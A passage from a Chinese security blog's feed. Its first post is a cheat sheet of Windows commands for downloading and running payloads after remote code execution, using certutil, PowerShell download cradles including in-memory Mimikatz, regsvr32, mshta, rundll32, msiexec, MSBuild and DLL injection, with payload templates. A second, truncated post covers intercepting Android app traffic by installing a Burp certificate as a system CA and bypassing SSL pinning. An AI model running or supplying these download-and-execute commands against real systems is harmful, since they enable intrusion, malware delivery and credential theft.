    <content type="html"><![CDATA[<h3 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h3><p>很多RCE漏洞均能有效在靶机中执行命令，但存在服务器可出网与不可出网的区别。对windows服务器而言，如果能出网。我们利用RCE获取服务器shell的方式都离不开上传shellcode到靶机上,<a id="more"></a>而其可使用姿势收集整理如下：</p><h3 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h3><h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">证书服务的一部分，可用来下载木马。</span><br><span class="line">certutil -urlcache -split -f http://x.x.x.x/msf a.exe &amp;&amp; a.exe</span><br><span class="line">certutil.exe -urlcache -split -f http://x.x.x.x/x.jar &amp;&amp;java -jar x.jar</span><br></pre></td></tr></table></figure><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a)、powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&apos;http://x/1.jpg‘,&apos;C:\Users\x\Desktop\test\12.exe&apos;)</span><br><span class="line">b)、powershell (Invoke-WebRequest http://x/1.jpg -O x.jpg)</span><br><span class="line">c)、也可以通过从UVC读取脚本执行：</span><br><span class="line">powershell -exec bypass -f \\webdavserver\a.ps1</span><br><span class="line">d)、内存加载：</span><br><span class="line">1、powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz</span><br><span class="line"></span><br><span class="line">2、powershell -exec bypass -c &quot;iwr https://gist.githubusercontent.com/Urahara3389/d83b6f9ccedf9aa53f70d987360dbc0e/raw/53ad790f87e0fd2c9449d5359358cd251c39297a/calc.ps1|iex&quot;</span><br><span class="line"></span><br><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;cs shellcode address&apos;))&quot;</span><br></pre></td></tr></table></figure><h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin 可用于创建下载或上传工作和监测其进展情况。不支持https、ftp协议。</span><br><span class="line">bitsadmin /TRANSFER /DOWNLOAD http://x.x.x.x/a C:\tmp\1 下载文件到靶机中</span><br><span class="line">bitsadmin /TRANSFER /UPLOAD D:\\1.ps \\共享目录\folder\xx 上传到共享目录（未测试）</span><br></pre></td></tr></table></figure><h4 id="CScript-WScript"><a href="#CScript-WScript" class="headerlink" title="CScript/WScript"></a>CScript/WScript</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">两种方式，第一种直接执行UNC路径下的文件：</span><br><span class="line">cscript //E:jscript \\webdavserver\folder\payload.txt</span><br><span class="line"></span><br><span class="line">第二种分两步先写入脚本后调用：</span><br><span class="line">a)</span><br><span class="line">echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; c:\windows\temp\d.vbs</span><br><span class="line">b)</span><br><span class="line">cscript C:\Windows\Temp\d.vbs http://x.x.x.x/a C:\Windows\Temp\1.exe</span><br></pre></td></tr></table></figure><h4 id="CSC"><a href="#CSC" class="headerlink" title="CSC"></a>CSC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">该方式也是通过先写入具有下载功能的c语言程序，通过csc打包成exe，再通过该exe下载</span><br><span class="line">1、echo using System.Net;class WebDL &#123; static void Main(string[] args)&#123;System.Net.WebClient client = new WebClient();client.DownloadFile(args[0],args[1]);&#125;&#125; &gt; c:\windows\temp\svhost.cs</span><br><span class="line">2、找到csc的所在目录，然后调用编译cs文件：</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc /out:c:\windows\temp\svhost.exe C:\Windows\Temp\svhost.cs</span><br><span class="line">3、使用svhost.exe执行下载</span><br><span class="line">c:\windows\temp\dl.exe http://xx/a.sh c:\windows\temp\a.sh</span><br></pre></td></tr></table></figure><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先将要执行的命令写入到ftp.txt，再使用ftp -s:ftp.txt执行文本中的命令</span><br><span class="line">ftp.txt:</span><br><span class="line">open xx.x.x.x 21</span><br><span class="line">GET xxx.exe</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><h4 id="JScript"><a href="#JScript" class="headerlink" title="JScript"></a>JScript</h4><p>1、写入以下文件执行即可a.js:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var Object = WScript.CreateObject(&quot;MSXML2.XMLHTTP&quot;);</span><br><span class="line">Object.open(&quot;GET&quot;,&quot;http://x/a&quot;,false);</span><br><span class="line">Object.send();</span><br><span class="line">if (Object.Status == 200)</span><br><span class="line">&#123;</span><br><span class="line">var Stream = WScript.CreateObject(&quot;ADODB.Stream&quot;);</span><br><span class="line">Stream.Open();</span><br><span class="line">Stream.Type = 1;</span><br><span class="line">Stream.Write(Object.ResponseBody);</span><br><span class="line">Stream.SaveToFile(&quot;C:\\Users\\x\\Desktop\\test\\212.exe&quot;, 2);</span><br><span class="line">Stream.Close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /u /s /i:http://site.com/a.png scrobj.dll</span><br><span class="line">远程加载</span><br><span class="line"></span><br><span class="line">a.png:</span><br><span class="line"></span><br><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">    progid=&quot;ShortJSRAT&quot;</span><br><span class="line">    classid=&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</span><br><span class="line">    &lt;!-- Learn from Casey Smith @subTee --&gt;</span><br><span class="line">    &lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">            ps  = &quot;ps script&quot;;</span><br><span class="line">            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);</span><br><span class="line"> </span><br><span class="line">        ]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure><h4 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mshta接受URL作为一个参数来执行HTA</span><br><span class="line">1） mshta http://xxxx.com/test.hta</span><br><span class="line">使用 mshta \\webdavserver\folder\payload.hta 还可隐藏mshta.exe所下载的内容。</span><br><span class="line">Msht具有执行内联脚本的能力，它将下载并执行一个脚本作为有效负载:</span><br><span class="line">2） mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://xxxxx.com/payload.sct&quot;&quot;)&quot;))</span><br><span class="line"></span><br><span class="line">test.hta:</span><br><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;xxx.exe&quot;</span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">demo</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/HEAD&gt; </span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure><h4 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new%20ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://reverse-tcp.xyz/test.exe&quot;,false);Object.send();if(Object.Status==200)&#123;Stream=new%20ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;E:\\test\\ssss2.exe&quot;,2);Stream.Close();&#125;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;%</span><br></pre></td></tr></table></figure><h4 id="pubprn-vbs"><a href="#pubprn-vbs" class="headerlink" title="pubprn.vbs"></a>pubprn.vbs</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pubprn.vbs是windows 7以后操作系统中存在的WSH脚本，它使用了GetObject()并且参数可控。</span><br><span class="line">cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</span><br><span class="line">详情可参考：https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/</span><br></pre></td></tr></table></figure><p><img src="https://n-b.oss-cn-beijing.aliyuncs.com/winrce01.png" alt="1"></p><h4 id="winrm-vbs-slmgr-vbs"><a href="#winrm-vbs-slmgr-vbs" class="headerlink" title="winrm.vbs/slmgr.vbs"></a>winrm.vbs/slmgr.vbs</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">使用该方式执行命令首先需要上传一个xsl文件，如下图所示：</span><br><span class="line">WsmPty.xsl:</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user=&quot;placeholder&quot;</span><br><span class="line">version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method=&quot;text&quot;&gt;&lt;/output&gt;</span><br><span class="line"> &lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt;</span><br><span class="line"> &lt;![CDATA[</span><br><span class="line"> var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);</span><br><span class="line"> ]]&gt; &lt;/ms:script&gt;</span><br><span class="line">&lt;/stylesheet&gt;</span><br><span class="line"></span><br><span class="line">在上传xsl文件之后，使用以下批处理文件进行启动：</span><br><span class="line">mkdir %SystemDrive%\可控目录</span><br><span class="line">copy %windir%\System32\cscript.exe %SystemDrive%\BypassDir</span><br><span class="line">%SystemDrive%\可控目录\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty</span><br></pre></td></tr></table></figure><h4 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h4><p>先通过msf生成msi木马文件，在使用该命令包含msi文件上线。(免杀是个关键问题)<br><code>msiexec /q /i http://x/x.png</code><br>msf生成msi格式即可，可重命名为png<br><code>msfvenom -f msi xxx &gt; x,png</code></p><h4 id="IEExec"><a href="#IEExec" class="headerlink" title="IEExec"></a>IEExec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.50727\IEExec.exe http://xx.x/a.exe</span><br></pre></td></tr></table></figure><h4 id="Cmd"><a href="#Cmd" class="headerlink" title="Cmd"></a>Cmd</h4><p><code>cmd.exe /k &lt; \\webdavserver\1.txt</code>  需要使用UNC/WebDAV服务器</p><h4 id="Regasm-Regsvc"><a href="#Regasm-Regsvc" class="headerlink" title="Regasm/Regsvc"></a>Regasm/Regsvc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\1.dll</span><br><span class="line">需要使用UNC/WebDAV服务器</span><br></pre></td></tr></table></figure><h4 id="Msbuild"><a href="#Msbuild" class="headerlink" title="Msbuild"></a>Msbuild</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\x.xml &gt; x.xml &amp; !MB! x.xml&quot;</span><br></pre></td></tr></table></figure><h4 id="pcalua-exe"><a href="#pcalua-exe" class="headerlink" title="pcalua.exe"></a>pcalua.exe</h4><p><code>pcalua.exe -a \\webdavserver\1.dll</code> 需要使用UNC/WebDAV服务器</p><h4 id="Cmstp"><a href="#Cmstp" class="headerlink" title="Cmstp"></a>Cmstp</h4><p><code>cmstp.exe /ni /s c:\cmstp\CorpVPN.inf</code><br>该方式未复现，先记录一下：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODY2ODU=" title="https://www.anquanke.com/post/id/86685">https://www.anquanke.com/post/id/86685<i class="fa fa-external-link"></i></span></p><h4 id="MavInject32"><a href="#MavInject32" class="headerlink" title="MavInject32"></a>MavInject32</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查阅资料是使用以下命令将恶意dll文件注入到正常进程中执行：(测试未建立连接2333)</span><br><span class="line">C:\Windows\SysWOW64\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</span><br></pre></td></tr></table></figure><h4 id="Odbcconf"><a href="#Odbcconf" class="headerlink" title="Odbcconf"></a>Odbcconf</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">两种加载恶意dll文件执行的方式，/F后可拼接任意后缀。</span><br><span class="line">odbcconf.exe /A &#123;REGSVR evil.dll&#125;</span><br><span class="line">odbcconf.exe / F odbcconf.config（可写一个任意后缀文件，里面内容加载获取shell的dll。如果文件未在odbcconf.exe目录下dll文件需有绝对路径。）</span><br></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>1、执行命令的方式可跟其他技术结合，因此总结该文又浮现一个大坑。</p><blockquote><p> 免杀问题。无论是打破边界获取入口点权限还是内网拓展、钓鱼攻击等等情况都对免杀有绝对依赖。</p></blockquote><p>2、UNC/WebDAV路径利用相关文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODY4OTQ=" title="https://www.anquanke.com/post/id/86894">https://www.anquanke.com/post/id/86894<i class="fa fa-external-link"></i></span></p><p>3、一个JS加载.Net程序的工具：DotNetToJScript <span class="exturl" data-url="aHR0cHM6Ly93d3cuNGhvdS5jb20vdG9vbHMvNjE3MS5odG1s" title="https://www.4hou.com/tools/6171.html">https://www.4hou.com/tools/6171.html<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;背景：&quot;&gt;&lt;a href=&quot;#背景：&quot; class=&quot;headerlink&quot; title=&quot;背景：&quot;&gt;&lt;/a&gt;背景：&lt;/h3&gt;&lt;p&gt;很多RCE漏洞均能有效在靶机中执行命令，但存在服务器可出网与不可出网的区别。对windows服务器而言，如果能出网。我们利用RCE获取服务器shell的方式都离不开上传shellcode到靶机上,
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Windows" scheme="http://sunu11.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>解决android模拟器抓包环境问题</title>
    <link href="http://sunu11.com/2019/03/31/APP_capturing_packets/"/>
    <id>http://sunu11.com/2019/03/31/APP_capturing_packets/</id>
    <published>2019-03-31T11:49:24.000Z</published>
    <updated>2019-12-12T10:18:35.410Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>无论</strong>是日常渗透测试还是在做红蓝对抗，或者甲方自查风险，手机端的暴露面都是不可忽视的一部分<a id="more"></a>。这里就涉及到一个很关键的模块，如何抓到app客户端与服务端的交互数据包。从防御方法上来讲，我所了解到的主要有以下几个情况：</p><p>1、远古时期，无ssl证书，明文传输数据。<br>2、采用ssl证书加密，但未使用做ssl Pining技术<br>3、采用ssl证书加密，但使用了ssl pining技术。<br>4、双向加密</p><p>而对于上述几种情况的抓包，第一种，几乎遇不到了，忽略2333.<br>第二种则需要根据android版本以及app的版本号来确定抓包方法，在这贴一下android版本中微信信任证书的情况作为示例：<br>安卓系统 7.0 以下版本，都会信任系统提供的证书<br>安卓系统 7.0 以上版本，微信 7.0 以下版本，微信会信任系统提供的证书<br>安卓系统 7.0 以上版本，微信 7.0 以上版本，微信只信任它自己配置的证书列表</p><h2 id="经历与经验"><a href="#经历与经验" class="headerlink" title="经历与经验"></a>经历与经验</h2><p>下面就简单记录一下抓取app数据包的过程。<br>个人比较喜欢使用burpsuite，因此做了以下尝试：</p><h3 id="方案1"><a href="#方案1" class="headerlink" title="方案1:"></a>方案1:</h3><p>1、下载网易mumu模拟器并安装。<br>地址：<span class="exturl" data-url="aHR0cDovL2ExMS5nZGwubmV0ZWFzZS5jb20vbmVtdS0yLjAuMjMtMTEwMTE1MzMxNS5leGU=" title="http://a11.gdl.netease.com/nemu-2.0.23-1101153315.exe">http://a11.gdl.netease.com/nemu-2.0.23-1101153315.exe<i class="fa fa-external-link"></i></span><br>模拟器2:腾讯网游助手（该模拟器微信不会被检测，但mac下经测试，某些app存在秒退现象）：<br>地址：<span class="exturl" data-url="aHR0cHM6Ly9zeXpzLnFxLmNvbS8=" title="https://syzs.qq.com/">https://syzs.qq.com/<i class="fa fa-external-link"></i></span></p><p>2、将burp证书用openssl将DER转换为PEM，然后输出subject_hash_old值并重命名该文件：命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">▶ openssl x509 -inform DER -in /Users/sunu11/Downloads/cacert.der  -out cacert.pem</span><br><span class="line">▶ openssl x509 -inform PEM -subject_hash_old -in cacert.pem|head -1</span><br><span class="line">get hash</span><br><span class="line">mv cacert.pem &lt;hash&gt;.0</span><br></pre></td></tr></table></figure></p><p>3、下载adb <span class="exturl" data-url="aHR0cDovL2FkYnNoZWxsLmNvbS9kb3dubG9hZHM=" title="http://adbshell.com/downloads">http://adbshell.com/downloads<i class="fa fa-external-link"></i></span> ，连接模拟器，将证书传入系统证书文件夹下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br><span class="line">adb connect 127.0.0.1:6555</span><br><span class="line">adb root</span><br><span class="line">adb remount //重新挂载为可写</span><br><span class="line">adb push 9a5ba575.0 /sdcard/</span><br><span class="line"></span><br><span class="line">adb connect 127.0.0.1:7555</span><br><span class="line">adb shell</span><br><span class="line">cat /sdcard/9a5ba575.0 &gt; /system/etc/security/cacerts/9a5ba575.0 //此处由于网易mumu共享文件夹中文编码在cmd中显示存在问题，无法直接mv</span><br><span class="line"></span><br><span class="line">chmod 644 /system/etc/security/cacerts/9a5ba575.0 //修改权限为644</span><br></pre></td></tr></table></figure></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/android-1.png" alt="图1"><br>然后重启模拟器，在受信任的凭据处即可看到burp的证书已经添加至系统证书下：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/android-2_cert_ok.png" alt="图2"></p><p>4、挂代理，抓包即可，基本上微信公众号，app、浏览器等数据包都可监听。<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/android-3_result_ok.png" alt="图3"></p><p>由于mac上模拟器存在各种原因，因此转向使用测试实体机。</p><h3 id="方案2"><a href="#方案2" class="headerlink" title="方案2:"></a>方案2:</h3><p>我找了个老魅族手机(推荐闲鱼）android5.1，直接安装burp证书，设置代理即可抓取未采用ssl Pining防止中间人的app数据包。但如果存在ssl Pining防护，则需要借助xposed+justTrustMe模块，将所有用于校验SSL证书的API都进行Hook，从而绕过证书检查的方式来进行抓包，而在这个过程中，其实是与android版本没有太大关系。</p><p>下面记录一下之前刷pxeil装xp失败的经历：<br>听朋友说谷歌的pxeil跟nexus好刷机，因此闲鱼淘了个pxeil手机。要求root+xp框架，忘了说版本号了，给我寄过来的是android9的。本来是装好了xp框架的，但是安装justTrustMe模块后，发现可以解密抓到部分https数据包，但无法抓到一个验证码的包，导致无法正常使用app功能。以为是xp问题，但后续证明并非如此，且原因未知。<br>在发现无法抓取整个数据包后，尝试降低android版本，听朋友说8.1有刷成功，就刷8.1的安卓包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">刷机必须解锁，也就是说能够进入bl界面，像华为这种，无法解锁的目前我也不知道怎么刷机。</span><br><span class="line">下载镜像包后解压到platform-tools目录。</span><br><span class="line">adb reboot bootloader</span><br><span class="line">进入镜像包解压目录。</span><br><span class="line">./flash-all.sh</span><br><span class="line">到这里基本上重启系统就更替完成了，但是由于我们想获取root权限，就需要安装一些其他软件，比如magisk、superSu等。这就需要用到下一步：。</span><br><span class="line">重启刷入twrp(有些情况img与zip都需要刷入，twrp是第三方recovery环境，可以刷任意系统扩展包）</span><br><span class="line">下载地址(能用最新的就用，老的也有可能有bug)：</span><br><span class="line">https://dl.twrp.me/sailfish/</span><br><span class="line">adb reboot bootloader</span><br><span class="line">fastboot boot twrp-3.3</span><br><span class="line">为了避免其他bug，先重启一波再进入rec</span><br><span class="line">然后安装magisk（获取root权限）</span><br><span class="line">https://github.com/topjohnwu/Magisk/releases/download/v20.1/Magisk-v20.1.zip</span><br><span class="line">在安装好之后，重启进入系统。</span><br><span class="line">magisk工具也有一个插件MagiskTrustUserCerts，这个装上之后，也能抓取某些app没有使用ssl Pining技术的数据包。</span><br><span class="line">然后再安装xp框架。</span><br><span class="line">这里两种方式：</span><br><span class="line">1、在coolapk.com安装xposed installer，安装好apk后，进入软件。用梯子直接下载。</span><br><span class="line">2、在下面链接下载xposed进入rec刷入系统：</span><br><span class="line">https://dl-xda.xposed.info/framework/sdk27/arm64/xposed-v90-sdk27-arm64-beta3.zip</span><br></pre></td></tr></table></figure><p>我自己先尝试的pxeil手机，在最后用coolapk安装xposed由于没有vpn，安装没成功，但是学弟翻墙后一键安装成功了：如图：<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/android-5.png" alt="图5"><br>然后我尝试进rec刷，一直爆错，因此更换成nexus5了。但是查资料有发现V2EX上有网上也有一种报错的解决方案<span class="exturl" data-url="aHR0cHM6Ly93d3cudjJleC5jb20vdC8zOTY0NzY=" title="https://www.v2ex.com/t/396476">https://www.v2ex.com/t/396476<i class="fa fa-external-link"></i></span>。说是用Flashfire可以刷成功，但是我记得迷迷糊糊有成功过一回，但是照样抓包不完全，遂弃之～</p><h3 id="方案3"><a href="#方案3" class="headerlink" title="方案3:"></a>方案3:</h3><p>对于双向证书校验一般情况抓包都会报错，原因在于服务器也会对客户端的证书进行验证，不通过则拒绝连接。因此在确定app是采用双向认证后，我们就需要获取服务端匹配的证书，用它对服务端进行匹配。<br>由于我本人没有实际对双向认证的app进行过抓包，但是通过学习安全客的这篇文章发现思路还是不难：<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTkwMDgw" title="https://www.anquanke.com/post/id/190080">https://www.anquanke.com/post/id/190080<i class="fa fa-external-link"></i></span><br>由于app采用双向认证，那客户端肯定能找到其证书文件，在获取到证书文件后，需要找到其安装密码.<br>在这一步有可能涉及到脱壳的知识，本文不做过多描述，在脱壳后用IDA加载二进制文件，在String窗口搜索证书的相关内容，追到证书密钥即可。然后再通过密钥在本机安装好证书：<br>用burp添加客户端证书:<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/android-6.png" alt="图6"><br>然后选中该证书进行抓包即可。</p><p>在尝试用pxeil去抓https的数据包，一直不想放弃，恶心了好几天。后来发现确实有可能不是操作问题后选择了换机器2333，以下是过程中的一些体会：<br>    1、其实，在过程中，有同事可以在windows系统上使用夜神抓取app的数据包，经过查看确实也是采用xp+justTrustMe模块。<br>    2、由于xp官方仅仅支持到android8.1，后续推荐使用类xp框架<span class="exturl" data-url="aHR0cHM6Ly90YWljaGkuY29vbC9SRUFETUVfQ04uaHRtbA==" title="https://taichi.cool/README_CN.html">太极<i class="fa fa-external-link"></i></span>。网上是有使用太极替代xp的例子。当然有有xp支持android9，不过需要安装魔图，而我第一次购买的二手机则是用的这种姿势，貌似那个验证码是tx的，抓包就卡在获取验证码处，因此放弃高版本android型号。<br>    3、钱还是个好东西，朋友用的iphone(越狱)，直接使用charles安装证书后就顺利抓到了ios端app的数据包。</p><h2 id="补充"><a href="#补充" class="headerlink" 